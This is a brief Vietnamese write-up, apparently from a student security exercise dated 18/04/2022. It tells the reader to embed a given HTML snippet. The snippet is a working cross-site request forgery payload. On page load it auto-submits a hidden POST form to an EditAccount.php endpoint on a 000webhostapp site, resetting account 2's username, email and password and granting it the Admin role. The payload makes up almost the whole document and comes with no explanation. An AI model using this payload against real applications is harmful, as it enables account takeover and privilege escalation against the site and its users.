Người thực hiện: Lê Trần Văn Chương
Ngày: 18/04/2022

Nhúng đoạn code sau vào:
```html
<body onload="document.formCsrf.submit()">
    <div>
        <form method="POST" name="formCsrf" action="https://00bluec10.000webhostapp.com/EditAccount.php?accountId=2">
            <input type="text" value="CSRF" name="username"></label><br />
            <input type="text" value="csrf@gmail.com" name="email"></label><br />
            <input type="text" value="csrf" name="password"></label><br />
            <select name="role">
                <option value="1">Admin</option>
            </select></label> <br />
        </form>
    </div>
</body>
```